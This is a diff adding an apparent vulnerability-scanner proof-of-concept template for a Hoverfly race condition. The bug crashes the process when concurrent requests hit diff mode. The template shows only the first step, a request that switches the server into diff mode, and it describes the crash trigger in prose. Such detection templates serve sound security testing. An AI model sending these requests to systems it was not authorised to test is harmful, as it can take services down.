@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "检测 Hoverfly Diff 模式下的并发 map 写入竞态条件漏洞。通过发送多个并发代理请求触发 responsesDiff map 的未同步读写，导致 Go runtime 抛出 fatal error 使进程崩溃。需先设置 Hoverfly 为 diff 模式并加载 simulation。"
+id = "POC-AVE-2026-0334"
+name = "Hoverfly Process Crash via Concurrent Map Write Race Condition in Diff Mode PoC"
+severity = "high"
+tags = ["ave-2026-0334"]
+vuln_id = [
+    "CVE-2026-50013",
+    "AVE-2026-0334",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/api/v2/hoverfly/mode"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"mode": "diff"}'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["diff"]
